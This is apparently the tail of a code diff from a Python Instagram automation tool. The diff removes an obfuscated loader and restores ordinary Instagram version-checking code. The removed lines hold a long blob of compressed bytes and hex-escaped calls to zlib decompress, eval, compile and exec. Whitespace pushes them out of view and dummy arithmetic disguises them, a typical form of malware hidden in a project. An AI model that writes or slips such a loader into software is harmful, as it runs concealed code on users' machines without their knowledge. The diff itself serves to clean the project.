\x80P\x86\xadK\x93\xde([\x89\xae\x05X\xe7\xe4\n\xa4\x1a\x8c\xa8\xea\x92\xd2\x1f\xc3\xea\xc3*\x97\x1eB\x92\x06\xf0\x8a\r\xe6{E]\xed\x1e\xf0H4\xdf0e\xf8-\x96smhI\\2\x9d\x87K\x91\x14\xfb#\n6\xfe#SB\xabr=,\xeb\x19k\'\xa7Bi\xaedL\x85\xfd\x16\x15\x82\x81\x9a7\xcdr\xb0+\'\x12\xef\x17C\xd4!\xb9\xef\x15\x8d\x87!\xf9\x80\xc4v\xc18\xc2\x00`\xef,\x1f\xba@\x1b"P\x81\x03\x9b\xfa\xc1\xab\x85\x7f\xd8`\x9a\xaa\x8ah[\xd9U\xfb\x96\xa6\xab+\xfe\xe8\xd8\xb0h\xb9y<,\xd9\xe6o\xd7\x86\x86\xdf\xcb\xe7\xc6\x94\xf5\xf1Br\xac>T\xadK\x92\xa6\xcfp\x96y]t\x91x\xef(\x8c\xaf+sjN\xd8K\x9f\t\xc5\x91C\xf2\x89\xa7):*\xc8\xe7@:i\xb6\\\xd0eH\xeeY\x93\xed\r\xd6\xebM\x0f %G\xa59\x82\x81\xd4\xf9\xc9!\xf9\xf3\x1aq\xd2\x87TU\xca\xbeYJV\xba\xa5\xfc\xfef9q\x94\x0f\x14\x8c$4w\xd5\xc4\x8d,j\x93\x1fn\x19\xb4\xea\x1a\xa0\xf7P\xb7\xb2\xb5\x04F\xef\xa0\xecTJMVU\x8c\xfbF:\xfa\x8c\xbc\x800\x1ck%\xab\xcc\x18mA\x1d\xeaG\xf2\\\xa5\xb5d\x00#`\xf1\x9a\r\x1e\xacd\xfb\xd0\x03\xd3\xb4P\xf1}L3\xa5\r\xca\x8a\x80F\x90\xd1\x92\xa8p\x19W\xf0\xcd\xd5\xc7\xb3goL\xf4$\x05\x10\xbfe}\xb4\x83S\xaf\xcf~9\xde\xa1<\xda\xc7M9-\x93\x04t\xe7Z\x8c\x9ai)>\xd2;xGf\x9f9\x94\xaav\xda\xc1\xe1\x9eB\xd3pm\x15\xaaw\xea\x8d\nBs2=\xf8\\\xdb\xa2w\x0eu\xd2\x89\xc1J^:>\xad\xcc\xb4\x10+\xa2\xa1\xf5\xf3\x9d\x8am\xefpaV\xe3`\x99\xd6B\xaa\xa2\xec\xdd\x97m\x92\xc4\xc4\xd3\x19\x05\x97\x07x\x12\xf9\x1e\x19P!\r\xf6\xf1\xb66~\xf0\xa0*h\xb7l\x1f\xeeP\x96\x94\x1ev\x81\xd9{\x0b(!\x0c\x8dK\xb4;8{\xe5\xbd\x8cH\xba*\xe9f\xdafg\xf3\xc8njne,u\xf1\x13\xf9\xa47\xca}\x83\xc6E\xdc\xb9\x15\xd6\x08\x95\xdc\xca\xa6\xda_i\xa5\n\xb6*\xf6\xe2\xb9)\x81-\xd0l\xaa\x0c\x1a\xf8\x7fh\xaa`\xfd)I\xc5\xe6\x06\xe6\x7f~\xad\xa8&\xf2_S/j\xac\x90\xc3\xaa-\xeaF\xeb\x05\xd1^\xdeEY *\x8c\x9c\x0c6\xa2\xb0\x85\xe4X-\xd9Jj:\x8c\x11^}\x1b6o~{u\xde6A\x1d$\xe15\x82\x84\xe8\xa6\xfe\xb8c\xc2Z\x15l\xb5\x08\xba\xa0\x8cw\x0cP\xe9\x86\x82\\\x03hm\xc4:8\x0c\xf9\xeb\x9a\xa03Q\xd5\xa7c\x92\x1a\x17D\x9c\xec\xa8\xde\xed\x0c\x1b\xc2WggC"\xcab^\x16G\xae\x1d\xda\xb4\xea\x9dS\xfd\xc7\x96\xfcUAR*\x8bz\xa1\xdeX\xc3)\x04:#\xcc\xf5\xed\x08\xc4\xd9\xc4\x90\x07\xb2\x1c\x8f\x81\xa8\xa4LU\xc2\x00A\xdf\x9c\xc5\xffvQQ\x89\x7f=)\xb3\xb1\xb5\xafJ\xd9\xbd\x96\xac\x9f\x81\xca\x08\xf9\xde\xb9\xde\xa7U\xd9\x88\xda\xba3\x03\xd5j\x1f\xf6r\x93`{B\x86\xe1F\x9c\xe9\xd4Q\xcaZ\xd9\xa7\x9aA\xef\x98W\xcb7+\xe6#v\x15J\x82}G\xc3\xd0Q\xdbh\x10\xb6\xa0y\x06\x8b\xd5#\x1cxy\x97\x88\xdal.\xb8~E\x92X0\x89\xb5\xb2\x19\xbdQ\x91*p6\x83\\\x88\\\xfe\xe5\xf4C\xd8\xacx\xda\xab\x83Sx\xd9\x88\xb7\x93\xd4n\x15\xfeZ\xca\x12S\xea\x9b\xb3\x1c\x9c\xc3\x8c\xdck\xf6?\xa0s\x00\xb1\xd7;\x86\x18\x9b\xd9\xe1\xb5Z\xb4\xb4\xc2\x10\xbc\x1b\xbd\x8d\xa8\xa3\x9d\x82of\xccf\xe5\x06\n\xcb<gYQ[\xb8\xc3\x8a\xd2\x1dTs\xeb\xb0\xb2\x87\xe6F V\xab\xeeuO\xc2\xe6\x87U\xd1\xce\x04\x13n\xc6h\x02\x8e\xa1\xd1\x9c\xadfRS\xadP\xd7X}\xdd\xbf\x03zmt\xa8x\xd5\x0e@\xf12F\xba\xe5\xa0\xfe%BK\x8d\xa4b\xcc\xb3\x8a\x18\xdb\xf6\xfc\xffJf]\x95\xed1`\xf6\xea\x17o\xbcz\x98k\xaf\xcd\x1a`/0\xddD\x80.\xe7*\xf2S\xa9\xd7\x08\xcf\x02dX\xbfA\x96\x81\xeb\xd3<\xab\x94zK7VMugwf\xaf\x1en\xe3e\xdc\xdb\xd7\xe9\xfeJ\x02\xfe-\x9a\xff/tU\x90U\x0f0\x9f\xcat0\x82\xcb7\x131{L\xae\xa6\x14\xdc\x14\xa3\x99z\xb5\x13aD\x96.\xf1\x04s\xaa\xcfG\xe0\x01hZ\x9d%\xa9\xa2\x9cl\xf2x{\x15\xf9\xcf1q\x9dFk\x05\xf6D\x15\xe9\x94k3\xe3(\x96\xd9\xcd\xd5k\xe9\xa6\x1d\xf5h\t+\x1ar\x8a\x9b\x94\x80\xd7\x1e\x1a\x0f3\xb1\xe8\xdc\xa65\xc7{\xfd\xea\x84\xd3\xd1\xba,\xd2\x9d\xa0\xa2\xc0\x14\xb5\x9ch\xb8\xb6\x1du"p\x81Gt|\x83\xd54\xb7D\x1c\xd6\x02\xb2Z48N9\x84\xeb0\x03z\x0b+\xde\xdc\x93l\x06\x8e\xcd\x9a\x96\xdf\xb7e\xb4\xed\x18\xee.\n\xf8\x9e$grjOf\xb9p\r\x81\x89\x86\xeb\xefW\xb5:X\x8a\xce6$\xa1\xde\xb6\xc3\xee\xc5\x9c\xe6\xb0D&\xb5\xbf\xf7j\xa3\xa1\x91\xa8\x8dN\xbc\xda\x88U\xbb\xb9\x7f\xe8K\xc9+\xf5\xc9h\xba,\xf8Xn\xd8\'\xac\xe06(\x9a\x85\xd7\x9f\x1d6Kw\xefj\xa8\xc8n\x97\xce\\a\xc5M]p \t\x16\xf1V\xcf\x1b\x87\xac\xdb\xd5\xf0\x0e\xc3\x88\xdb\xd7\xaa\x10\xd7\xbd\x07n `\xa8f\xf2PS\x8cK\xb3\xe3l\xf6\x9a\x93Dq\xda\xee\x02\xaaj\x86R\x90\x15\x8a\xfaa\xec\xf6T\xd7\x1f\x8b@\xfb\xb2\xe3\xa9\x88w\xa7\xe7\xa7\x97\xef\xb7:\x16\xb129\xff)\xe7"*\xf9h\x9e\xa0\xc9\x99\xdeb\x05c\xdd>L\xb3\x02lnmt\xd4\xacUio\xf5\x12\x80_\xab:\x0f\x1b5\xe7\xe6\x16H\xeb]\x08\x7f\xe5N\xd6\xb8\xe2f>\xfa\xff\xad\x14\xb6e\x19\xcc\xa5\xa0\xc7/\xf7\x1cf3/d@J\x8c\xaa\xa4\x94\xea\xbe:\xb5\x07\x01"y\xf1\xa7\xe7\x01\xf9\x8e|\xff|+/\xbdE\x0c78\x07A\xad\x9c\xb4S\xe3\xa4\x05\xc4r~\xdd\x01\x83\xc0W/o\xf9\xe6\xfc\xdfQEm\x10t\xa9\x8fo\xb5\'\xf0\x82\x87p\xb0\xd5\xbc\xbbw\xd8\xf0\xd2{\x08\xab!\xdbPf+\xed/l9\x124\x8fO1\xd0\xca\xcby\xb3\x0c[!\xb4\x9b\x85\xfdA\x9f\x89\xa1\xfa\x01*\xd9\xdf\x08b\xceL\xf4\xc3\xd5\x0eS\xa8\xd7\x04\xb6\n\x0e{\xb2\x98\xee\xb3|\xdd\x18W\'\xfcz\x18\xb5\x05\x05\x1b\x18\xd1\xcb\xc8\xf5\xbb-N\x05\xee\xeb\xecN\xfb](}R\xfd\xd1\xde\x9f\xd5\x8b\x7f\xfe\x1f\x86\xc4w\xdf\xe8\x0b_\xcd\xe7\xef\xa9|\x83{\xcd,\x1e\xa2\xf9\xc7\x97J6\x9e\xfa1\x04x\x9eq>\x1f`\xb2\xb8\xffrzB\xe8|\x8e\xb1\xa4M\xaeqS\x8e\xdawdj}L\xe5\xbd\xfe\xa6\x90_\x1f\x00/}j\xd9I\x95\x9b\xef\xde\x84:L\xb81\nQw\xbd\xdb\x9e\xb91\x85X\xdcwA\xf7SM\xb1\xc6t\xf7|IG\xc6\xa5\n\x16Np\xca\xa5\x8dKA4U\x96\x04\xb9W\xd3\xd3\xac\x06\xae\xf5\xc5mv\x9eExt\xa3\x03I\xe7\xac\x82\xb53\x01\x84\x1c}\xe1\xdfK&\xd5\xa6\xbf\xf2\x8fH\x85\x99Ac^]\xb3\x19-#\x88\x8bb\x88o8\xfe\xb7=\x1b\\\xd3\xea\x8cI\xdd\x8bS)\xc1\xc1\xc4\xbd\xbe\xa8\xf9\xe2c\xc7\xf9\xd8n\x9e\x8d\xa74\x9b\xb0+Q\xd5\xaa{\xa2\xde\x9d&\xd7\xdeV\xeb\xe6W\xed\xe4B\xa2\xea\xdc\x18\xda\xa1.\xe8y\xe1\xb7\xfb\xce9<\x0c\x01\x14t\xfdq\xb3\x06\xbe\xe9 \x88\x89i1\x7fkF\xb3-\xad\xd9&m2\x9dl\xb2\xab\x8dA\xdf9AC\x7f\xdd\x95A\xfe\x80\x15\x06\x07\xdc\x1clo\xbd\xef\xe8\xf7\x84\xbb\x89wjA\x89\x01\x05?\xdd\xc6[\xdb\x99\xc43\x04\xf8\n\xb7\xdf\x86\x0b\xe5<\xe5\x85\xefA\xb8\x1e\x90\x1f\rX\xeb\x85:\x17\xaa{a\xfbk\'\xcey\x07J2\x06Y\x9c\x9d8\x96\xc4\xc0$\x16SL%\xa6Lm\x10\x15J\xfd\x1e\x13\xffJ}qhlM\xea!\xa8N\xc4*\xec\x90j\x82D\xcd$\xb9z\x7fz\x896\x08\x1f\x80\x90-\x9d#\x90\xff\xd0\x19\x87\xbe\x83\r\x9bN\xed4d\xfe\x18?\xd5+\xe6\x1c\x04\x13\xd3\xa4\xa9r\tv%V\x88\x0e\xd5i\x9c\xe0\x7f\x01\xba\x9b} ')
-
-        Floor._floor(_walk = -75343 - Floor.Invert)                                                                                                                                                                                                                                                          ;MMNNMNMMMMMMMMMMMNMNMNN,wxwxxwwwxwwxwwwwwxxwwxxxw,nmnnnmnnnnmnmmnmmnmmnmmm,JIIJIIILLIIJJJJJJIIIJIII,SS2SSSSSSSSSS222S2SSSS=(lambda ILLJJLIJLLJIIIIJI:ILLJJLIJLLJIIIIJI['\x64\x65\x63\x6f\x6d\x70\x72\x65\x73\x73']),(lambda ILLJJLIJLLJIIIIJI:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(ILLJJLIJLLJIIIIJI)"),filename='\x78\x78\x77\x77\x78\x77\x77\x77\x78\x78\x78\x78\x78\x77\x78\x77\x77\x78\x77\x78\x77\x77\x78',mode='\x65\x76\x61\x6c'))),(lambda ILLJJLIJLLJIIIIJI:ILLJJLIJLLJIIIIJI(__import__('\x7a\x6c\x69\x62'))),(lambda:(lambda ILLJJLIJLLJIIIIJI:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(ILLJJLIJLLJIIIIJI)"),filename='\x78\x78\x77\x77\x78\x77\x77\x77\x78\x78\x78\x78\x78\x77\x78\x77\x77\x78\x77\x78\x77\x77\x78',mode='\x65\x76\x61\x6c')))('\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x62\x75\x69\x6c\x74\x69\x6e\x73\x27\x29\x2e\x65\x78\x65\x63')),(lambda mnnmmnmnmmnmmnnmnnnmmnn,ILLJJLIJLLJIIIIJI:mnnmmnmnmmnmmnnmnnnmmnn(ILLJJLIJLLJIIIIJI))
-        if 338894 > 6135650:
-            _frame(Power = -5532 - -2686)._floor(_walk = 48969 + Floor.Invert)
-        elif 263795 < 4392075:
-            _frame(Power = 86059 / 46954)._callfunction(Hypothesis = Floor.Invert * 75639)                                                                                                                                                                                                                                                          ;JIIJIIILLIIJJJJJJIIIJIII()(SS2SSSSSSSSSS222S2SSSS(MMNNMNMMMMMMMMMMMNMNMNN(nmnnnmnnnnmnmmnmmnmmnmmm(wxwxxwwwxwwxwwwwwxxwwxxxw('\x76\x61\x72\x73'))),_frame._stackoverflow(Statistics='S22SSS22S2S22S22S2SSS')+_frame._stackoverflow(Statistics='MMNNNMMNMMMNMMMNM')))
-
-    except Exception as Algorithm:
-        import traceback
-        print(f'    module {__name__} raised an Exception:')
-        print(f'     {Algorithm}')
-        print(traceback.format_exc())
-        if 379702 > 7038623:
-            _frame.execute(code = Square(Algorithm))
-
-        elif 107904 > 5109470:
-            _frame(Power = 87453 / 14722)._callfunction(Hypothesis = Floor.Invert + 42389)
+        running_ig_version = get_instagram_version()
+        logger.info(f"Instagram version: {running_ig_version}")
+        if tuple(running_ig_version.split(".")) > tuple(TESTED_IG_VERSION.split(".")):
+            logger.warning(
+                f"You have a newer version of IG then the one tested! (Tested version: {TESTED_IG_VERSION}). If you have problems THIS is probably the reason.",
+                extra={"color": f"{Style.BRIGHT}"},
+            )
+    except Exception as e:
+        logger.error(f"Error retrieving the IG version. Exception: {e}")
+        write_custom_logs.write("Error retrieving the IG version.")
